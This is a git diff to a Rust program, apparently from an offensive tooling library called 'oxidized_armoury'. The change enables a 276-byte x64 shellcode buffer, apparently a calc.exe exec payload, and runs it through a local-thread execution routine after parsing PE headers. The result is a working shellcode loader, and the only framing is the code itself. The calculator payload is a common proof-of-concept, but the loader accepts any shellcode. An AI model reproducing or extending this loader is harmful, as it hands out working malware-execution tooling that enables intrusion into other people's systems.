@@ -1,4 +1,4 @@
-//use oxidized_armoury::execution::thread::execute_local_thread;
+use oxidized_armoury::execution::thread::execute_local_thread;
 use oxidized_armoury::util::function_table::export_dll;
 use oxidized_armoury::util::pe_headers::PeHeader;
 use std::mem::transmute;
@@ -7,7 +7,7 @@ use std::time::Duration;
 use std::ffi::c_void;
 
 fn main() {
-    /*
+    
     let buf: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
         0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
@@ -29,30 +29,12 @@ fn main() {
         0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
-    */
+    
 
     unsafe {
         dbg!("process start");
         let header = PeHeader::parse();
-        dbg!(&header);
-        let dll_address = header.dll_map.get("kernel32.dll").unwrap().clone();
-        dbg!(dll_address);
-        let function_table = export_dll(dll_address);
 
-        let test = function_table.get("CopyFileA").unwrap();
-        dbg!(test);
-        //let test = FunctionTable::new(header);
-
-        //dbg!(header.export_table_address);
-        //let test = FunctionTable::new(header);
-        //dbg!(test);
-        //assert!(!test.is_null());
-        //println!("--- main fn pointer ---");
-        //let test_ptr:*const u8 = 0x00007ff665e70000 as *const u8;
-        //dbg!(test_ptr);
-        //let swag:u8 = *test_ptr;
-        //dbg!(swag);
-        sleep(Duration::from_secs(60));
-        //let _ = execute_local_thread(buf.to_vec());
+        let _ = execute_local_thread(header, buf.to_vec());
     }
 }
